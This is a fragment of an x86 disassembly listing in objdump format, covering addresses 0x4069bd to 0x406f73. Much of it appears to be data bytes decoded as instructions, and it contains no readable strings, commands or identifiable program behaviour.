  4069bd:	02 5c 00 67          	add    0x67(%eax,%eax,1),%bl
  4069c1:	25 00 00 00 00       	and    $0x0,%eax
  4069c6:	86 08                	xchg   %cl,(%eax)
  4069c8:	f9                   	stc
  4069c9:	07                   	pop    %es
  4069ca:	5f                   	pop    %edi
  4069cb:	02 5c 00 6f          	add    0x6f(%eax,%eax,1),%bl
  4069cf:	25 00 00 00 00       	and    $0x0,%eax
  4069d4:	e1 01                	loope  0x4069d7
  4069d6:	c8 14 64 02          	enter  $0x6414,$0x2
  4069da:	5c                   	pop    %esp
  4069db:	00 7c 25 00          	add    %bh,0x0(%ebp,%eiz,1)
  4069df:	00 00                	add    %al,(%eax)
  4069e1:	00 86 18 ff 14 0e    	add    %al,0xe14ff18(%esi)
  4069e7:	00 5c 00 20          	add    %bl,0x20(%eax,%eax,1)
  4069eb:	55                   	push   %ebp
  4069ec:	00 00                	add    %al,(%eax)
  4069ee:	00 00                	add    %al,(%eax)
  4069f0:	96                   	xchg   %eax,%esi
  4069f1:	00 3e                	add    %bh,(%esi)
  4069f3:	0c b1                	or     $0xb1,%al
  4069f5:	02 5c 00 8f          	add    -0x71(%eax,%eax,1),%bl
  4069f9:	25 00 00 00 00       	and    $0x0,%eax
  4069fe:	96                   	xchg   %eax,%esi
  4069ff:	00 3e                	add    %bh,(%esi)
  406a01:	0c b8                	or     $0xb8,%al
  406a03:	02 5e 00             	add    0x0(%esi),%bl
  406a06:	44                   	inc    %esp
  406a07:	55                   	push   %ebp
  406a08:	00 00                	add    %al,(%eax)
  406a0a:	00 00                	add    %al,(%eax)
  406a0c:	96                   	xchg   %eax,%esi
  406a0d:	00 3e                	add    %bh,(%esi)
  406a0f:	0c be                	or     $0xbe,%al
  406a11:	02 5f 00             	add    0x0(%edi),%bl
  406a14:	78 20                	js     0x406a36
  406a16:	00 00                	add    %al,(%eax)
  406a18:	00 00                	add    %al,(%eax)
  406a1a:	86 18                	xchg   %bl,(%eax)
  406a1c:	ff 14 0e             	call   *(%esi,%ecx,1)
  406a1f:	00 61 00             	add    %ah,0x0(%ecx)
  406a22:	9e                   	sahf
  406a23:	25 00 00 00 00       	and    $0x0,%eax
  406a28:	96                   	xchg   %eax,%esi
  406a29:	00 3f                	add    %bh,(%edi)
  406a2b:	0f c5                	pextrw $0xc5,(bad),%eax
  406a2d:	02 61 00             	add    0x0(%ecx),%ah
  406a30:	04 56                	add    $0x56,%al
  406a32:	00 00                	add    %al,(%eax)
  406a34:	00 00                	add    %al,(%eax)
  406a36:	96                   	xchg   %eax,%esi
  406a37:	00 58 0c             	add    %bl,0xc(%eax)
  406a3a:	cb                   	lret
  406a3b:	02 62 00             	add    0x0(%edx),%ah
  406a3e:	cc                   	int3
  406a3f:	56                   	push   %esi
  406a40:	00 00                	add    %al,(%eax)
  406a42:	00 00                	add    %al,(%eax)
  406a44:	96                   	xchg   %eax,%esi
  406a45:	00 34 1d d2 02 64 00 	add    %dh,0x6402d2(,%ebx,1)
  406a4c:	ab                   	stos   %eax,%es:(%edi)
  406a4d:	25 00 00 00 00       	and    $0x0,%eax
  406a52:	96                   	xchg   %eax,%esi
  406a53:	00 d5                	add    %dl,%ch
  406a55:	18 da                	sbb    %bl,%dl
  406a57:	02 66 00             	add    0x0(%esi),%ah
  406a5a:	c6                   	(bad)
  406a5b:	25 00 00 00 00       	and    $0x0,%eax
  406a60:	96                   	xchg   %eax,%esi
  406a61:	00 2a                	add    %ch,(%edx)
  406a63:	06                   	push   %es
  406a64:	e1 02                	loope  0x406a68
  406a66:	68 00 e6 25 00       	push   $0x25e600
  406a6b:	00 00                	add    %al,(%eax)
  406a6d:	00 96 00 62 10 e8    	add    %dl,-0x17ef9e00(%esi)
  406a73:	02 6a 00             	add    0x0(%edx),%ch
  406a76:	6c                   	insb   (%dx),%es:(%edi)
  406a77:	57                   	push   %edi
  406a78:	00 00                	add    %al,(%eax)
  406a7a:	00 00                	add    %al,(%eax)
  406a7c:	96                   	xchg   %eax,%esi
  406a7d:	00 a1 00 ef 02 6c    	add    %ah,0x6c02ef00(%ecx)
  406a83:	00 9c 57 00 00 00 00 	add    %bl,0x0(%edi,%edx,2)
  406a8a:	96                   	xchg   %eax,%esi
  406a8b:	00 a2 13 f6 02 6e    	add    %ah,0x6e02f613(%edx)
  406a91:	00 78 20             	add    %bh,0x20(%eax)
  406a94:	00 00                	add    %al,(%eax)
  406a96:	00 00                	add    %al,(%eax)
  406a98:	86 18                	xchg   %bl,(%eax)
  406a9a:	ff 14 0e             	call   *(%esi,%ecx,1)
  406a9d:	00 70 00             	add    %dh,0x0(%eax)
  406aa0:	e0 58                	loopne 0x406afa
  406aa2:	00 00                	add    %al,(%eax)
  406aa4:	00 00                	add    %al,(%eax)
  406aa6:	96                   	xchg   %eax,%esi
  406aa7:	00 65 18             	add    %ah,0x18(%ebp)
  406aaa:	84 01                	test   %al,(%ecx)
  406aac:	70 00                	jo     0x406aae
  406aae:	6c                   	insb   (%dx),%es:(%edi)
  406aaf:	59                   	pop    %ecx
  406ab0:	00 00                	add    %al,(%eax)
  406ab2:	00 00                	add    %al,(%eax)
  406ab4:	96                   	xchg   %eax,%esi
  406ab5:	00 5c 18 84          	add    %bl,-0x7c(%eax,%ebx,1)
  406ab9:	01 71 00             	add    %esi,0x0(%ecx)
  406abc:	00 00                	add    %al,(%eax)
  406abe:	01 00                	add    %eax,(%eax)
  406ac0:	c6                   	(bad)
  406ac1:	0a 00                	or     (%eax),%al
  406ac3:	00 01                	add    %al,(%ecx)
  406ac5:	00 c6                	add    %al,%dh
  406ac7:	0a 00                	or     (%eax),%al
  406ac9:	00 01                	add    %al,(%ecx)
  406acb:	00 c6                	add    %al,%dh
  406acd:	0a 00                	or     (%eax),%al
  406acf:	00 01                	add    %al,(%ecx)
  406ad1:	00 c6                	add    %al,%dh
  406ad3:	0a 00                	or     (%eax),%al
  406ad5:	00 01                	add    %al,(%ecx)
  406ad7:	00 c6                	add    %al,%dh
  406ad9:	0a 00                	or     (%eax),%al
  406adb:	00 01                	add    %al,(%ecx)
  406add:	00 c6                	add    %al,%dh
  406adf:	0a 00                	or     (%eax),%al
  406ae1:	00 01                	add    %al,(%ecx)
  406ae3:	00 c6                	add    %al,%dh
  406ae5:	0a 00                	or     (%eax),%al
  406ae7:	00 01                	add    %al,(%ecx)
  406ae9:	00 c6                	add    %al,%dh
  406aeb:	0a 00                	or     (%eax),%al
  406aed:	00 01                	add    %al,(%ecx)
  406aef:	00 c6                	add    %al,%dh
  406af1:	0a 00                	or     (%eax),%al
  406af3:	00 01                	add    %al,(%ecx)
  406af5:	00 c6                	add    %al,%dh
  406af7:	0a 00                	or     (%eax),%al
  406af9:	00 01                	add    %al,(%ecx)
  406afb:	00 a7 07 00 00 01    	add    %ah,0x1000007(%edi)
  406b01:	00 4c 13 00          	add    %cl,0x0(%ebx,%edx,1)
  406b05:	00 02                	add    %al,(%edx)
  406b07:	00 ac 08 00 00 03 00 	add    %ch,0x30000(%eax,%ecx,1)
  406b0e:	aa                   	stos   %al,%es:(%edi)
  406b0f:	10 00                	adc    %al,(%eax)
  406b11:	00 04 00             	add    %al,(%eax,%eax,1)
  406b14:	1c 18                	sbb    $0x18,%al
  406b16:	00 00                	add    %al,(%eax)
  406b18:	01 00                	add    %eax,(%eax)
  406b1a:	cc                   	int3
  406b1b:	12 00                	adc    (%eax),%al
  406b1d:	00 01                	add    %al,(%ecx)
  406b1f:	00 13                	add    %dl,(%ebx)
  406b21:	0d 00 00 01 00       	or     $0x10000,%eax
  406b26:	b9 0d 00 00 01       	mov    $0x100000d,%ecx
  406b2b:	00 b9 0d 00 00 01    	add    %bh,0x100000d(%ecx)
  406b31:	00 23                	add    %ah,(%ebx)
  406b33:	0d 00 00 01 00       	or     $0x10000,%eax
  406b38:	ce                   	into
  406b39:	18 00                	sbb    %al,(%eax)
  406b3b:	00 01                	add    %al,(%ecx)
  406b3d:	00 c4                	add    %al,%ah
  406b3f:	04 00                	add    $0x0,%al
  406b41:	00 02                	add    %al,(%edx)
  406b43:	00 f7                	add    %dh,%bh
  406b45:	1b 00                	sbb    (%eax),%eax
  406b47:	00 03                	add    %al,(%ebx)
  406b49:	00 5c 1b 00          	add    %bl,0x0(%ebx,%ebx,1)
  406b4d:	00 01                	add    %al,(%ecx)
  406b4f:	00 2f                	add    %ch,(%edi)
  406b51:	07                   	pop    %es
  406b52:	00 00                	add    %al,(%eax)
  406b54:	01 00                	add    %eax,(%eax)
  406b56:	37                   	aaa
  406b57:	18 00                	sbb    %al,(%eax)
  406b59:	00 02                	add    %al,(%edx)
  406b5b:	00 1a                	add    %bl,(%edx)
  406b5d:	1b 00                	sbb    (%eax),%eax
  406b5f:	00 01                	add    %al,(%ecx)
  406b61:	00 f5                	add    %dh,%ch
  406b63:	16                   	push   %ss
  406b64:	00 00                	add    %al,(%eax)
  406b66:	01 00                	add    %eax,(%eax)
  406b68:	35 00 00 00 02       	xor    $0x2000000,%eax
  406b6d:	00 9b 00 00 00 03    	add    %bl,0x3000000(%ebx)
  406b73:	00 9e 00 00 00 01    	add    %bl,0x1000000(%esi)
  406b79:	00 4c 13 00          	add    %cl,0x0(%ebx,%edx,1)
  406b7d:	00 02                	add    %al,(%edx)
  406b7f:	00 65 0b             	add    %ah,0xb(%ebp)
  406b82:	00 00                	add    %al,(%eax)
  406b84:	01 00                	add    %eax,(%eax)
  406b86:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406b87:	07                   	pop    %es
  406b88:	00 00                	add    %al,(%eax)
  406b8a:	02 00                	add    (%eax),%al
  406b8c:	c6                   	(bad)
  406b8d:	0a 00                	or     (%eax),%al
  406b8f:	00 01                	add    %al,(%ecx)
  406b91:	00 c6                	add    %al,%dh
  406b93:	0a 00                	or     (%eax),%al
  406b95:	00 01                	add    %al,(%ecx)
  406b97:	00 a7 07 00 00 01    	add    %ah,0x1000007(%edi)
  406b9d:	00 b8 02 00 00 01    	add    %bh,0x1000002(%eax)
  406ba3:	00 20                	add    %ah,(%eax)
  406ba5:	0e                   	push   %cs
  406ba6:	00 00                	add    %al,(%eax)
  406ba8:	01 00                	add    %eax,(%eax)
  406baa:	3f                   	aas
  406bab:	1c 00                	sbb    $0x0,%al
  406bad:	00 01                	add    %al,(%ecx)
  406baf:	00 db                	add    %bl,%bl
  406bb1:	1c 00                	sbb    $0x0,%al
  406bb3:	00 01                	add    %al,(%ecx)
  406bb5:	00 af 1b 00 00 01    	add    %ch,0x100001b(%edi)
  406bbb:	00 af 1b 00 00 01    	add    %ch,0x100001b(%edi)
  406bc1:	00 af 1b 00 00 01    	add    %ch,0x100001b(%edi)
  406bc7:	00 af 1b 00 00 01    	add    %ch,0x100001b(%edi)
  406bcd:	00 32                	add    %dh,(%edx)
  406bcf:	00 00                	add    %al,(%eax)
  406bd1:	00 02                	add    %al,(%edx)
  406bd3:	00 87 00 00 00 01    	add    %al,0x1000000(%edi)
  406bd9:	00 af 1b 00 00 01    	add    %ch,0x100001b(%edi)
  406bdf:	00 af 1b 00 00 01    	add    %ch,0x100001b(%edi)
  406be5:	00 b9 18 00 00 01    	add    %bh,0x1000018(%ecx)
  406beb:	00 49 16             	add    %cl,0x16(%ecx)
  406bee:	00 00                	add    %al,(%eax)
  406bf0:	01 00                	add    %eax,(%eax)
  406bf2:	c5 16                	lds    (%esi),%edx
  406bf4:	00 00                	add    %al,(%eax)
  406bf6:	01 00                	add    %eax,(%eax)
  406bf8:	c5 16                	lds    (%esi),%edx
  406bfa:	00 00                	add    %al,(%eax)
  406bfc:	01 00                	add    %eax,(%eax)
  406bfe:	fc                   	cld
  406bff:	1b 00                	sbb    (%eax),%eax
  406c01:	00 01                	add    %al,(%ecx)
  406c03:	00 fc                	add    %bh,%ah
  406c05:	1b 00                	sbb    (%eax),%eax
  406c07:	00 01                	add    %al,(%ecx)
  406c09:	00 fc                	add    %bh,%ah
  406c0b:	1b 00                	sbb    (%eax),%eax
  406c0d:	00 01                	add    %al,(%ecx)
  406c0f:	00 fc                	add    %bh,%ah
  406c11:	1b 00                	sbb    (%eax),%eax
  406c13:	00 01                	add    %al,(%ecx)
  406c15:	00 fc                	add    %bh,%ah
  406c17:	1b 00                	sbb    (%eax),%eax
  406c19:	00 01                	add    %al,(%ecx)
  406c1b:	00 b9 0d 00 00 01    	add    %bh,0x100000d(%ecx)
  406c21:	00 a6 0d 00 00 02    	add    %ah,0x200000d(%esi)
  406c27:	00 b1 0d 00 00 01    	add    %dh,0x100000d(%ecx)
  406c2d:	00 c6                	add    %al,%dh
  406c2f:	0a 00                	or     (%eax),%al
  406c31:	00 01                	add    %al,(%ecx)
  406c33:	00 c6                	add    %al,%dh
  406c35:	0a 00                	or     (%eax),%al
  406c37:	00 01                	add    %al,(%ecx)
  406c39:	00 c6                	add    %al,%dh
  406c3b:	0a 00                	or     (%eax),%al
  406c3d:	00 01                	add    %al,(%ecx)
  406c3f:	00 25 1c 00 00 01    	add    %ah,0x100001c
  406c45:	00 c6                	add    %al,%dh
  406c47:	0a 00                	or     (%eax),%al
  406c49:	00 01                	add    %al,(%ecx)
  406c4b:	00 a7 07 00 00 01    	add    %ah,0x1000007(%edi)
  406c51:	00 a7 07 00 00 01    	add    %ah,0x1000007(%edi)
  406c57:	00 b6 17 00 00 01    	add    %dh,0x1000017(%esi)
  406c5d:	00 b6 17 00 00 01    	add    %dh,0x1000017(%esi)
  406c63:	00 c6                	add    %al,%dh
  406c65:	0a 00                	or     (%eax),%al
  406c67:	00 01                	add    %al,(%ecx)
  406c69:	00 c6                	add    %al,%dh
  406c6b:	0a 00                	or     (%eax),%al
  406c6d:	00 01                	add    %al,(%ecx)
  406c6f:	00 c6                	add    %al,%dh
  406c71:	0a 00                	or     (%eax),%al
  406c73:	00 01                	add    %al,(%ecx)
  406c75:	00 f2                	add    %dh,%dl
  406c77:	1c 00                	sbb    $0x0,%al
  406c79:	00 02                	add    %al,(%edx)
  406c7b:	00 c6                	add    %al,%dh
  406c7d:	0a 00                	or     (%eax),%al
  406c7f:	00 01                	add    %al,(%ecx)
  406c81:	00 f2                	add    %dh,%dl
  406c83:	1c 00                	sbb    $0x0,%al
  406c85:	00 02                	add    %al,(%edx)
  406c87:	00 c6                	add    %al,%dh
  406c89:	0a 00                	or     (%eax),%al
  406c8b:	00 01                	add    %al,(%ecx)
  406c8d:	00 26                	add    %ah,(%esi)
  406c8f:	07                   	pop    %es
  406c90:	00 00                	add    %al,(%eax)
  406c92:	01 00                	add    %eax,(%eax)
  406c94:	26 07                	es pop %es
  406c96:	00 00                	add    %al,(%eax)
  406c98:	01 00                	add    %eax,(%eax)
  406c9a:	65 0d 00 00 01 00    	gs or  $0x10000,%eax
  406ca0:	c6                   	(bad)
  406ca1:	0a 00                	or     (%eax),%al
  406ca3:	00 01                	add    %al,(%ecx)
  406ca5:	00 66 0e             	add    %ah,0xe(%esi)
  406ca8:	00 00                	add    %al,(%eax)
  406caa:	01 00                	add    %eax,(%eax)
  406cac:	6b 0e 00             	imul   $0x0,(%esi),%ecx
  406caf:	00 01                	add    %al,(%ecx)
  406cb1:	00 6b 0e             	add    %ch,0xe(%ebx)
  406cb4:	00 00                	add    %al,(%eax)
  406cb6:	01 00                	add    %eax,(%eax)
  406cb8:	c5 16                	lds    (%esi),%edx
  406cba:	00 00                	add    %al,(%eax)
  406cbc:	01 00                	add    %eax,(%eax)
  406cbe:	26 07                	es pop %es
  406cc0:	00 00                	add    %al,(%eax)
  406cc2:	01 00                	add    %eax,(%eax)
  406cc4:	b6 17                	mov    $0x17,%dh
  406cc6:	00 00                	add    %al,(%eax)
  406cc8:	01 00                	add    %eax,(%eax)
  406cca:	b6 17                	mov    $0x17,%dh
  406ccc:	00 00                	add    %al,(%eax)
  406cce:	01 00                	add    %eax,(%eax)
  406cd0:	c6                   	(bad)
  406cd1:	0a 00                	or     (%eax),%al
  406cd3:	00 01                	add    %al,(%ecx)
  406cd5:	00 c6                	add    %al,%dh
  406cd7:	0a 00                	or     (%eax),%al
  406cd9:	00 01                	add    %al,(%ecx)
  406cdb:	00 c6                	add    %al,%dh
  406cdd:	0a 00                	or     (%eax),%al
  406cdf:	00 01                	add    %al,(%ecx)
  406ce1:	00 b6 17 00 00 02    	add    %dh,0x2000017(%esi)
  406ce7:	00 8e 10 00 00 01    	add    %cl,0x1000010(%esi)
  406ced:	00 b6 17 00 00 01    	add    %dh,0x1000017(%esi)
  406cf3:	00 6f 0b             	add    %ch,0xb(%edi)
  406cf6:	00 00                	add    %al,(%eax)
  406cf8:	02 00                	add    (%eax),%al
  406cfa:	b6 17                	mov    $0x17,%dh
  406cfc:	00 00                	add    %al,(%eax)
  406cfe:	01 00                	add    %eax,(%eax)
  406d00:	b6 17                	mov    $0x17,%dh
  406d02:	00 00                	add    %al,(%eax)
  406d04:	01 00                	add    %eax,(%eax)
  406d06:	b6 17                	mov    $0x17,%dh
  406d08:	00 00                	add    %al,(%eax)
  406d0a:	02 00                	add    (%eax),%al
  406d0c:	75 0e                	jne    0x406d1c
  406d0e:	00 00                	add    %al,(%eax)
  406d10:	01 00                	add    %eax,(%eax)
  406d12:	b6 17                	mov    $0x17,%dh
  406d14:	00 00                	add    %al,(%eax)
  406d16:	02 00                	add    (%eax),%al
  406d18:	bc 16 00 00 01       	mov    $0x1000016,%esp
  406d1d:	00 b6 17 00 00 02    	add    %dh,0x2000017(%esi)
  406d23:	00 6b 0e             	add    %ch,0xe(%ebx)
  406d26:	00 00                	add    %al,(%eax)
  406d28:	01 00                	add    %eax,(%eax)
  406d2a:	b6 17                	mov    $0x17,%dh
  406d2c:	00 00                	add    %al,(%eax)
  406d2e:	02 00                	add    (%eax),%al
  406d30:	6b 0e 00             	imul   $0x0,(%esi),%ecx
  406d33:	00 01                	add    %al,(%ecx)
  406d35:	00 b6 17 00 00 02    	add    %dh,0x2000017(%esi)
  406d3b:	00 66 0e             	add    %ah,0xe(%esi)
  406d3e:	00 00                	add    %al,(%eax)
  406d40:	01 00                	add    %eax,(%eax)
  406d42:	b6 17                	mov    $0x17,%dh
  406d44:	00 00                	add    %al,(%eax)
  406d46:	02 00                	add    (%eax),%al
  406d48:	70 0e                	jo     0x406d58
  406d4a:	00 00                	add    %al,(%eax)
  406d4c:	01 00                	add    %eax,(%eax)
  406d4e:	b6 17                	mov    $0x17,%dh
  406d50:	00 00                	add    %al,(%eax)
  406d52:	02 00                	add    (%eax),%al
  406d54:	70 0e                	jo     0x406d64
  406d56:	00 00                	add    %al,(%eax)
  406d58:	01 00                	add    %eax,(%eax)
  406d5a:	af                   	scas   %es:(%edi),%eax
  406d5b:	1b 00                	sbb    (%eax),%eax
  406d5d:	00 01                	add    %al,(%ecx)
  406d5f:	00 af 1b 16 00 59    	add    %ch,0x5900161b(%edi)
  406d65:	00 18                	add    %bl,(%eax)
  406d67:	00 5d 00             	add    %bl,0x0(%ebp)
  406d6a:	b1 00                	mov    $0x0,%cl
  406d6c:	e8 1a bb 01 b1       	call   0xb142288b
  406d71:	00 d4                	add    %dl,%ah
  406d73:	1b bf 01 b1 00 c3    	sbb    -0x3cff4eff(%edi),%edi
  406d79:	19 0e                	sbb    %ecx,(%esi)
  406d7b:	00 b9 00 e7 14 64    	add    %bh,0x6414e700(%ecx)
  406d81:	02 c9                	add    %cl,%cl
  406d83:	00 ff                	add    %bh,%bh
  406d85:	14 01                	adc    $0x1,%al
  406d87:	03 d1                	add    %ecx,%edx
  406d89:	00 ff                	add    %bh,%bh
  406d8b:	14 0e                	adc    $0xe,%al
  406d8d:	00 d9                	add    %bl,%cl
  406d8f:	00 ff                	add    %bh,%bh
  406d91:	14 2e                	adc    $0x2e,%al
  406d93:	03 e9                	add    %ecx,%ebp
  406d95:	00 ff                	add    %bh,%bh
  406d97:	14 6b                	adc    $0x6b,%al
  406d99:	01 f1                	add    %esi,%ecx
  406d9b:	00 ff                	add    %bh,%bh
  406d9d:	14 6b                	adc    $0x6b,%al
  406d9f:	01 f9                	add    %edi,%ecx
  406da1:	00 ff                	add    %bh,%bh
  406da3:	14 6b                	adc    $0x6b,%al
  406da5:	01 01                	add    %eax,(%ecx)
  406da7:	01 ff                	add    %edi,%edi
  406da9:	14 6b                	adc    $0x6b,%al
  406dab:	01 09                	add    %ecx,(%ecx)
  406dad:	01 ff                	add    %edi,%edi
  406daf:	14 6b                	adc    $0x6b,%al
  406db1:	01 11                	add    %edx,(%ecx)
  406db3:	01 ff                	add    %edi,%edi
  406db5:	14 6b                	adc    $0x6b,%al
  406db7:	01 19                	add    %ebx,(%ecx)
  406db9:	01 ff                	add    %edi,%edi
  406dbb:	14 6b                	adc    $0x6b,%al
  406dbd:	01 21                	add    %esp,(%ecx)
  406dbf:	01 ff                	add    %edi,%edi
  406dc1:	14 6b                	adc    $0x6b,%al
  406dc3:	01 29                	add    %ebp,(%ecx)
  406dc5:	01 ff                	add    %edi,%edi
  406dc7:	14 6b                	adc    $0x6b,%al
  406dc9:	01 31                	add    %esi,(%ecx)
  406dcb:	01 ff                	add    %edi,%edi
  406dcd:	14 4b                	adc    $0x4b,%al
  406dcf:	02 39                	add    (%ecx),%bh
  406dd1:	01 ff                	add    %edi,%edi
  406dd3:	14 0e                	adc    $0xe,%al
  406dd5:	00 41 01             	add    %al,0x1(%ecx)
  406dd8:	ff 14 6b             	call   *(%ebx,%ebp,2)
  406ddb:	01 49 01             	add    %ecx,0x1(%ecx)
  406dde:	7e 12                	jle    0x406df2
  406de0:	7f 00                	jg     0x406de2
  406de2:	51                   	push   %ecx
  406de3:	01 6e 00             	add    %ebp,0x0(%esi)
  406de6:	c4 03                	les    (%ebx),%eax
  406de8:	59                   	pop    %ecx
  406de9:	01 ed                	add    %ebp,%ebp
  406deb:	19 7f 00             	sbb    %edi,0x0(%edi)
  406dee:	51                   	push   %ecx
  406def:	01 6f 10             	add    %ebp,0x10(%edi)
  406df2:	84 00                	test   %al,(%eax)
  406df4:	09 00                	or     %eax,(%eax)
  406df6:	ff 14 0e             	call   *(%esi,%ecx,1)
  406df9:	00 61 01             	add    %ah,0x1(%ecx)
  406dfc:	3c 01                	cmp    $0x1,%al
  406dfe:	cd 03                	int    $0x3
  406e00:	51                   	push   %ecx
  406e01:	01 1e                	add    %ebx,(%esi)
  406e03:	0c 2a                	or     $0x2a,%al
  406e05:	01 61 01             	add    %esp,0x1(%ecx)
  406e08:	ad                   	lods   %ds:(%esi),%eax
  406e09:	0c d3                	or     $0xd3,%al
  406e0b:	03 11                	add    (%ecx),%edx
  406e0d:	00 ff                	add    %bh,%bh
  406e0f:	14 2b                	adc    $0x2b,%al
  406e11:	02 11                	add    (%ecx),%dl
  406e13:	00 c4                	add    %al,%ah
  406e15:	1c d9                	sbb    $0xd9,%al
  406e17:	03 69 01             	add    0x1(%ecx),%ebp
  406e1a:	8f                   	(bad)
  406e1b:	1c df                	sbb    $0xdf,%al
  406e1d:	03 61 01             	add    0x1(%ecx),%esp
  406e20:	b3 16                	mov    $0x16,%bl
  406e22:	e5 03                	in     $0x3,%eax
  406e24:	81 01 e7 01 c7 00    	addl   $0xc701e7,(%ecx)
  406e2a:	79 01                	jns    0x406e2d
  406e2c:	35 0d eb 03 19       	xor    $0x1903eb0d,%eax
  406e31:	00 ff                	add    %bh,%bh
  406e33:	14 09                	adc    $0x9,%al
  406e35:	04 19                	add    $0x19,%al
  406e37:	00 45 0b             	add    %al,0xb(%ebp)
  406e3a:	01 03                	add    %eax,(%ebx)
  406e3c:	19 00                	sbb    %eax,(%eax)
  406e3e:	32 0b                	xor    (%ebx),%cl
  406e40:	01 03                	add    %eax,(%ebx)
  406e42:	c1 01 69             	roll   $0x69,(%ecx)
  406e45:	1d 16 04 c1 01       	sbb    $0x1c10416,%eax
  406e4a:	df 19                	fistps (%ecx)
  406e4c:	1c 04                	sbb    $0x4,%al
  406e4e:	d1 01                	roll   $1,(%ecx)
  406e50:	ff 14 0e             	call   *(%esi,%ecx,1)
  406e53:	00 d1                	add    %dl,%cl
  406e55:	01 d8                	add    %ebx,%eax
  406e57:	1b 23                	sbb    (%ebx),%esp
  406e59:	04 d9                	add    $0xd9,%al
  406e5b:	01 f0                	add    %esi,%eax
  406e5d:	15 28 04 19 00       	adc    $0x190428,%eax
  406e62:	46                   	inc    %esi
  406e63:	19 30                	sbb    %esi,(%eax)
  406e65:	04 19                	add    $0x19,%al
  406e67:	00 39                	add    %bh,(%ecx)
  406e69:	03 bf 01 19 00 46    	add    0x46001901(%edi),%edi
  406e6f:	19 3c 02             	sbb    %edi,(%edx,%eax,1)
  406e72:	99                   	cltd
  406e73:	01 ff                	add    %edi,%edi
  406e75:	14 0e                	adc    $0xe,%al
  406e77:	00 a1 01 ff 14 36    	add    %ah,0x3614ff01(%ecx)
  406e7d:	02 99 01 60 17 38    	add    0x38176001(%ecx),%bl
  406e83:	04 99                	add    $0x99,%al
  406e85:	01 49 0c             	add    %ecx,0xc(%ecx)
  406e88:	70 01                	jo     0x406e8b
  406e8a:	c1 01 df             	roll   $0xdf,(%ecx)
  406e8d:	19 3f                	sbb    %edi,(%edi)
  406e8f:	04 d1                	add    $0xd1,%al
  406e91:	01 d8                	add    %ebx,%eax
  406e93:	1b 49 04             	sbb    0x4(%ecx),%ecx
  406e96:	f1                   	int1
  406e97:	01 69 08             	add    %ebp,0x8(%ecx)
  406e9a:	0e                   	push   %cs
  406e9b:	00 f9                	add    %bh,%cl
  406e9d:	01 ff                	add    %edi,%edi
  406e9f:	14 4f                	adc    $0x4f,%al
  406ea1:	04 01                	add    $0x1,%al
  406ea3:	02 ff                	add    %bh,%bh
  406ea5:	14 56                	adc    $0x56,%al
  406ea7:	04 21                	add    $0x21,%al
  406ea9:	00 ff                	add    %bh,%bh
  406eab:	14 5c                	adc    $0x5c,%al
  406ead:	04 19                	add    $0x19,%al
  406eaf:	00 2c 1b             	add    %ch,(%ebx,%ebx,1)
  406eb2:	66 04 09             	data16 add $0x9,%al
  406eb5:	00 64 0c 47          	add    %ah,0x47(%esp,%ecx,1)
  406eb9:	02 21                	add    (%ecx),%ah
  406ebb:	00 68 1a             	add    %ch,0x1a(%eax)
  406ebe:	6c                   	insb   (%dx),%es:(%edi)
  406ebf:	04 29                	add    $0x29,%al
  406ec1:	02 ff                	add    %bh,%bh
  406ec3:	14 56                	adc    $0x56,%al
  406ec5:	04 29                	add    $0x29,%al
  406ec7:	00 ff                	add    %bh,%bh
  406ec9:	14 78                	adc    $0x78,%al
  406ecb:	04 31                	add    $0x31,%al
  406ecd:	02 ff                	add    %bh,%bh
  406ecf:	14 56                	adc    $0x56,%al
  406ed1:	04 c1                	add    $0xc1,%al
  406ed3:	00 0c 03             	add    %cl,(%ebx,%eax,1)
  406ed6:	82 04 39 02          	addb   $0x2,(%ecx,%edi,1)
  406eda:	99                   	cltd
  406edb:	07                   	pop    %es
  406edc:	8f 04 31             	pop    (%ecx,%esi,1)
  406edf:	00 70 17             	add    %dh,0x17(%eax)
  406ee2:	96                   	xchg   %eax,%esi
  406ee3:	04 c1                	add    $0xc1,%al
  406ee5:	00 69 08             	add    %ch,0x8(%ecx)
  406ee8:	0e                   	push   %cs
  406ee9:	00 19                	add    %bl,(%ecx)
  406eeb:	00 69 08             	add    %ch,0x8(%ecx)
  406eee:	0e                   	push   %cs
  406eef:	00 29                	add    %ch,(%ecx)
  406ef1:	00 69 08             	add    %ch,0x8(%ecx)
  406ef4:	0e                   	push   %cs
  406ef5:	00 c1                	add    %al,%cl
  406ef7:	00 04 03             	add    %al,(%ebx,%eax,1)
  406efa:	a1 04 49 02 6e       	mov    0x6e024904,%eax
  406eff:	00 a7 04 c1 00 11    	add    %ah,0x1100c104(%edi)
  406f05:	03 ae 04 51 02 ff    	add    -0xfdaefc(%esi),%ebp
  406f0b:	14 56                	adc    $0x56,%al
  406f0d:	04 49                	add    $0x49,%al
  406f0f:	01 ff                	add    %edi,%edi
  406f11:	14 b6                	adc    $0xb6,%al
  406f13:	04 49                	add    $0x49,%al
  406f15:	01 91 1b bd 04 61    	add    %edx,0x6104bd1b(%ecx)
  406f1b:	02 80 14 cf 04 49    	add    0x4904cf14(%eax),%al
  406f21:	02 b3 16 9f 01 19    	add    0x19019f16(%ebx),%dh
  406f27:	00 3a                	add    %bh,(%edx)
  406f29:	0f d6                	(bad)
  406f2b:	04 c1                	add    $0xc1,%al
  406f2d:	00 e7                	add    %ah,%bh
  406f2f:	08 de                	or     %bl,%dh
  406f31:	04 59                	add    $0x59,%al
  406f33:	02 ff                	add    %bh,%bh
  406f35:	14 2b                	adc    $0x2b,%al
  406f37:	02 c1                	add    %cl,%al
  406f39:	00 a6 11 15 02 c1    	add    %ah,-0x3efdeaef(%esi)
  406f3f:	00 40 0d             	add    %al,0xd(%eax)
  406f42:	0e                   	push   %cs
  406f43:	00 61 02             	add    %ah,0x2(%ecx)
  406f46:	ed                   	in     (%dx),%eax
  406f47:	19 9a 00 71 02 3e    	sbb    %ebx,0x3e027100(%edx)
  406f4d:	19 0a                	sbb    %ecx,(%edx)
  406f4f:	00 59 01             	add    %bl,0x1(%ecx)
  406f52:	c8 15 c7 00          	enter  $0xc715,$0x0
  406f56:	a1 02 e1 07 01       	mov    0x107e102,%eax
  406f5b:	05 79 02 ff 14       	add    $0x14ff0279,%eax
  406f60:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f63:	02 40 18             	add    0x18(%eax),%al
  406f66:	07                   	pop    %es
  406f67:	05 81 02 a7 06       	add    $0x6a70281,%eax
  406f6c:	0d 05 a9 02 f0       	or     $0xf002a905,%eax
  406f71:	06                   	push   %es
  406f72:	47                   	inc    %edi
  406f73:	02 b1 02 5b 07 47    	add    0x47075b02(%ecx),%dh
